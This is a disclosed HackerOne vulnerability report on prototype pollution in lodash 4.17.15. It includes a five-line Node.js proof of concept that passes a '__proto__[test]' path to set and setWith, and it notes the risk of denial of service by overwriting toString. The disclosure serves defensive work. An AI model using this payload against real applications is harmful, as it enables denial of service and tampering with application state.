# Prototype Pollution lodash 4.17.15

## Report Details
- **Report ID**: 864701
- **URL**: https://hackerone.com/reports/864701
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-02T11:10:22.062Z
- **Disclosed**: 2020-08-21T10:34:29.931Z

## Reporter
- **Username**: awarau
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Prototype Pollution in lodash version 4.17.15
It allows Denial of Service and more. 

# Module
**module name:** lodash
**version:** 4.17.15
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

27M in the last week

# Vulnerability

## Vulnerability Description

## Steps To Reproduce:
1. Create a JS file with this contents:

lod = require('lodash')
lod.setWith({}, "__proto__[test]", "123")
lod.set({}, "__proto__[test2]", "456")
console.log(test)
console.log(test2)

2. Execute it with node
3. Observe that test and test2 are now on the Object.prototype.

## Supporting Material/References:

This is a variation on:
https://hackerone.com/reports/380873

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

test and test2 could just have easily been toString(). This would allow an attacker to cause a denial of service as all objects inherit from the Object.prototype. 
Additionally, if there are sensitive variables and attributes in a particular application, these can be controlled via the prototype.

## Attachments
No attachments
